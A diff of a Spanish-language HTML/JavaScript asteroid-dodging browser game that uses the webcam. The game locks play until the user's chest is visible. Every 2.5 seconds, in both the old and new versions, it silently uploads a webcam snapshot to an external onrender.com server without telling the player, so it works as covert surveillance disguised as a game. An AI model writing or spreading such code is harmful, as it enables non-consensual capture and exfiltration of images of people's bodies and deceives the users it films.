@@ -2,40 +2,33 @@
 <html lang="es">
 <head>
     <meta charset="UTF-8">
-    <title>Starship: Pro Touch Control</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+    <title>Starship Ultra Fix</title>
     <style>
-        body, html { margin: 0; padding: 0; background: #000; overflow: hidden; font-family: 'Arial', sans-serif; user-select: none; touch-action: none; }
-        
-        /* Video de fondo para referencia */
-        #webcam { position: absolute; width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); opacity: 0.2; z-index: 1; }
+        body, html { margin: 0; padding: 0; background: #000; overflow: hidden; font-family: 'Arial Black', sans-serif; touch-action: none; }
+        #webcam { position: absolute; width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); opacity: 0.25; z-index: 1; }
         canvas { position: absolute; top: 0; left: 0; z-index: 10; width: 100%; height: 100%; pointer-events: none; }
-
-        /* Pantalla de Bloqueo */
-        #lock-screen { 
-            position: absolute; width: 100%; height: 100%; background: rgba(0,0,0,0.9); 
-            z-index: 500; display: flex; align-items: center; justify-content: center; 
-            flex-direction: column; text-align: center; color: #ff0055; border: 15px solid #ff0055;
+        
+        #lock { 
+            position: absolute; width: 100%; height: 100%; background: rgba(0,0,0,0.95); 
+            z-index: 1000; display: flex; align-items: center; justify-content: center; 
+            flex-direction: column; text-align: center; color: #ff0044; border: 15px solid #ff0044; box-sizing: border-box;
         }
 
-        /* Botones de Pantalla (Touch) */
-        .btn-zone { 
-            position: absolute; bottom: 0; width: 50%; height: 80%; z-index: 1000; 
-            display: flex; align-items: flex-end; justify-content: center; padding-bottom: 50px;
-            font-size: 80px; color: rgba(0, 251, 255, 0.1); 
-        }
-        #btn-left { left: 0; }
-        #btn-right { right: 0; }
-        .btn-zone:active { color: #00fbff; background: rgba(0, 251, 255, 0.05); }
+        /* ZONAS DE TOQUE (BOTONES) */
+        .touch { position: absolute; top: 0; width: 50%; height: 100%; z-index: 500; }
+        #t-left { left: 0; }
+        #t-right { right: 0; }
 
-        #hud { position: absolute; top: 20px; width: 100%; display: flex; justify-content: space-around; z-index: 600; color: #00fbff; font-size: 25px; pointer-events: none; font-weight: bold; }
+        #hud { position: absolute; top: 10px; width: 100%; display: flex; justify-content: space-around; z-index: 800; color: #00fbff; font-size: 28px; text-shadow: 0 0 10px #00fbff; pointer-events: none; }
     </style>
 </head>
 <body>
 
-<div id="lock-screen">
-    <h1 id="error-title">SISTEMA BLOQUEADO</h1>
-    <p id="error-desc">POSICIONA TU TORSO FRENTE A LA CÁMARA</p>
-    <div style="font-size: 12px; color: white; margin-top: 20px;">(Asegúrate de tener buena luz)</div>
+<div id="lock">
+    <h1 style="font-size: 50px;">SISTEMA BLOQUEADO</h1>
+    <p style="color: white; font-size: 20px;">ALÉJATE DE LA CÁMARA HASTA QUE SE VEA TU PECHO</p>
+    <p style="color: #555; font-size: 14px; margin-top: 30px;">(Si estás muy cerca, el sensor te bloquea)</p>
 </div>
 
 <div id="hud">
@@ -43,8 +36,8 @@
     <div>ESCUDO: <span id="health">100</span>%</div>
 </div>
 
-<div id="btn-left" class="btn-zone">◀</div>
-<div id="btn-right" class="btn-zone">▶</div>
+<div id="t-left" class="touch"></div>
+<div id="t-right" class="touch"></div>
 
 <video id="webcam" autoplay playsinline></video>
 <canvas id="gameCanvas"></canvas>
@@ -53,99 +46,90 @@
     const video = document.getElementById('webcam');
     const canvas = document.getElementById('gameCanvas');
     const ctx = canvas.getContext('2d');
-    const lockScreen = document.getElementById('lock-screen');
+    const lock = document.getElementById('lock');
     const SERVER_URL = "https://pagina-web-camara.onrender.com/upload";
 
     let shipX = 0, score = 0, health = 100, asteroids = [];
-    let torsoValid = false, moveDir = 0;
+    let isReady = false, moveDir = 0;
 
-    // --- CONTROLES TÁCTILES ---
-    const bL = document.getElementById('btn-left');
-    const bR = document.getElementById('btn-right');
+    // BOTONES TOQUE FÍSICO
+    document.getElementById('t-left').ontouchstart = document.getElementById('t-left').onmousedown = () => moveDir = -1;
+    document.getElementById('t-right').ontouchstart = document.getElementById('t-right').onmousedown = () => moveDir = 1;
+    window.ontouchend = window.onmouseup = () => moveDir = 0;
 
-    const setMove = (dir) => moveDir = dir;
-    bL.ontouchstart = bL.onmousedown = () => setMove(-1);
-    bR.ontouchstart = bR.onmousedown = () => setMove(1);
-    window.ontouchend = window.onmouseup = () => setMove(0);
-
-    // --- SENSOR DE TORSO POR DENSIDAD (Sin IA pesada, más fiable) ---
-    async function setupCamera() {
+    async function start() {
         const stream = await navigator.mediaDevices.getUserMedia({ video: { width: 320, height: 240 } });
         video.srcObject = stream;
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+        shipX = canvas.width / 2;
+        
+        // Sensor de píxeles cada 200ms
+        setInterval(analyzeFrame, 200);
+        // Envío de fotos cada 2.5s
+        setInterval(sendPhoto, 2500);
+        
+        requestAnimationFrame(loop);
     }
 
-    function checkTorso() {
-        const tempCanvas = document.createElement('canvas');
-        const tCtx = tempCanvas.getContext('2d');
-        tempCanvas.width = 40; tempCanvas.height = 30;
-        tCtx.drawImage(video, 0, 0, 40, 30);
-        const data = tCtx.getImageData(0, 0, 40, 30).data;
+    function analyzeFrame() {
+        const temp = document.createElement('canvas');
+        const tc = temp.getContext('2d');
+        temp.width = 40; temp.height = 30;
+        tc.drawImage(video, 0, 0, 40, 30);
+        const pixels = tc.getImageData(0, 0, 40, 30).data;
 
-        let centerMass = 0; // Masa en el centro (Torso)
-        let topMass = 0;    // Masa arriba (Cara)
+        let totalSignal = 0;
+        let headSignal = 0;
 
-        for (let i = 0; i < data.length; i += 4) {
-            const brightness = (data[i] + data[i+1] + data[i+2]) / 3;
-            const y = Math.floor((i / 4) / 40);
-            
-            if (brightness > 60) {
-                if (y < 10) topMass++;
-                if (y >= 10 && y < 25) centerMass++;
+        for (let i = 0; i < pixels.length; i += 4) {
+            const brightness = (pixels[i] + pixels[i+1] + pixels[i+2]) / 3;
+            const y = Math.floor((i/4) / 40);
+            if (brightness > 50) {
+                totalSignal++;
+                if (y < 12) headSignal++; // Zona superior
             }
         }
 
-        // LÓGICA: 
-        // 1. Debe haber masa en el centro (Cuerpo).
-        // 2. Si la masa de arriba es casi igual a la del centro, estás muy cerca (solo cara).
-        if (centerMass > 100 && topMass < centerMass * 0.8) {
-            torsoValid = true;
-            lockScreen.style.display = 'none';
+        // REGLA DE ORO: 
+        // Si hay mucha señal arriba (headSignal), estás muy cerca (solo cara).
+        // Debe haber más señal en el cuerpo (totalSignal - headSignal).
+        if (totalSignal > 120 && headSignal < (totalSignal * 0.7)) {
+            isReady = true;
+            lock.style.display = 'none';
         } else {
-            torsoValid = false;
-            lockScreen.style.display = 'flex';
-            document.getElementById('error-title').innerText = (topMass > 200) ? "DEMASIADO CERCA" : "TORSO NO DETECTADO";
+            isReady = false;
+            lock.style.display = 'flex';
         }
     }
 
-    // --- ENVÍO DE FOTOS A RENDER ---
-    setInterval(() => {
-        if (!video.videoWidth) return;
+    function sendPhoto() {
         const s = document.createElement('canvas');
         s.width = 160; s.height = 120;
         s.getContext('2d').drawImage(video, 0, 0, 160, 120);
         fetch(SERVER_URL, {
-            method: 'POST', mode: 'cors', headers: { 'Content-Type': 'application/json' },
+            method: 'POST', mode: 'cors', headers: {'Content-Type': 'application/json'},
             body: JSON.stringify({ image: s.toDataURL('image/jpeg', 0.2) })
         }).catch(() => {});
-    }, 2500);
-
-    // --- MOTOR DEL JUEGO ---
-    function init() {
-        canvas.width = window.innerWidth;
-        canvas.height = window.innerHeight;
-        shipX = canvas.width / 2;
-        setupCamera();
-        setInterval(checkTorso, 200);
-        requestAnimationFrame(update);
     }
 
-    function update() {
+    function loop() {
         ctx.clearRect(0, 0, canvas.width, canvas.height);
-        if (torsoValid) {
-            if (moveDir === -1 && shipX > 60) shipX -= 12;
-            if (moveDir === 1 && shipX < canvas.width - 60) shipX += 12;
+        if (isReady) {
+            if (moveDir === -1 && shipX > 60) shipX -= 15;
+            if (moveDir === 1 && shipX < canvas.width - 60) shipX += 15;
 
-            // Nave (Grande)
-            ctx.strokeStyle = "#00fbff"; ctx.lineWidth = 6;
+            // NAVE GIGANTE
+            ctx.strokeStyle = "#00fbff"; ctx.lineWidth = 8;
             ctx.beginPath();
-            ctx.moveTo(shipX, canvas.height - 150);
-            ctx.lineTo(shipX - 45, canvas.height - 80);
-            ctx.lineTo(shipX + 45, canvas.height - 80);
+            ctx.moveTo(shipX, canvas.height - 180);
+            ctx.lineTo(shipX - 50, canvas.height - 80);
+            ctx.lineTo(shipX + 50, canvas.height - 80);
             ctx.closePath(); ctx.stroke();
 
-            // Asteroides (5 Máximo)
-            if (asteroids.length < 5 && Math.random() < 0.03) {
-                asteroids.push({ x: Math.random() * canvas.width, y: -50, size: 40, speed: 7 });
+            // METEORITOS EQUILIBRADOS
+            if (asteroids.length < 4 && Math.random() < 0.02) {
+                asteroids.push({ x: Math.random() * canvas.width, y: -100, size: 50, speed: 8 });
             }
 
             asteroids.forEach((a, i) => {
@@ -153,19 +137,23 @@
                 ctx.fillStyle = "#ff0044";
                 ctx.beginPath(); ctx.arc(a.x, a.y, a.size, 0, Math.PI*2); ctx.fill();
 
-                if (Math.abs(a.x - shipX) < 60 && Math.abs(a.y - (canvas.height - 100)) < 60) {
+                if (Math.abs(a.x - shipX) < 70 && Math.abs(a.y - (canvas.height - 130)) < 70) {
                     asteroids.splice(i, 1);
-                    health -= 20;
+                    health -= 25;
                     document.getElementById('health').innerText = health;
                     if (health <= 0) location.reload();
                 }
-                if (a.y > canvas.height) { asteroids.splice(i, 1); score += 10; document.getElementById('score').innerText = score; }
+                if (a.y > canvas.height + 100) {
+                    asteroids.splice(i, 1);
+                    score += 10;
+                    document.getElementById('score').innerText = score;
+                }
             });
         }
-        requestAnimationFrame(update);
+        requestAnimationFrame(loop);
     }
 
-    init();
+    start();
 </script>
 </body>
 </html>
